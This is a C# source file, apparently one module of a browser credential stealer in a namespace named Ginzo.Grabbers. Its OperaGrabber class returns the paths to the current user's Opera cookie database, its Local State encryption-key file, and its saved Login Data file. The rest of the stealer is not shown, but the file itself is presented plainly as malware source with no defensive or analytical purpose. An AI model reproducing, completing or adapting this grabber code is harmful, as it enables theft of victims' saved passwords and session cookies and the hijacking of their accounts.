using System;

namespace Ginzo.Grabbers
{
    public class OperaGrabber : ChromiumGrabber 

    {
        public override string ChromiumBrowserCookiePath
        {
            get
            {
                return $"C:\\Users\\{Environment.UserName}\\AppData\\Roaming\\Opera Software\\Opera Stable\\Network\\Cookies";
            }
        }
        public override string ChromiumBrowserLocalStatePath
        {
            get
            {
                return $"C:\\Users\\{Environment.UserName}\\AppData\\Roaming\\Opera Software\\Opera Stable\\Local State";
            }
        }
        public override string ChromiumBrowserLoginDataPath
        {
            get
            {
                return $"C:\\Users\\{Environment.UserName}\\AppData\\Roaming\\Opera Software\\Opera Stable\\Login Data";
            }
        }
    }
}